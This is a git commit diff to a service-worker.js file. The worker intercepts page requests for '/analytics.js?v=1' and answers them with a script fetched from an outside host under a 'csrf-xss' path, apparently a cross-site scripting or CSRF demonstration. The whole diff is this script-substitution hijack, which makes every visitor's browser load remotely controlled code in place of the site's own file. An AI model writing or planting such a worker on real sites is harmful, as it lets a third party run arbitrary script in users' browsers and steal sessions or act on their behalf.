c13347c70a811453ecbba6537c32eb136842c769
navj04 <championgamersp@gmail.com>
2025-04-23 21:10:45 +1000

    Update service-worker.js

--- service-worker.js
+++ service-worker.js
@@ -1,5 +1,5 @@
 self.addEventListener('fetch', event => {
-  if (event.request.url.endsWith('/analytics.js')) {
+  if (event.request.url.endsWith('/analytics.js?v=1')) {
     event.respondWith(fetch('https://nvj04.github.io/csrf-xss/analytics.js'));
   }
 });
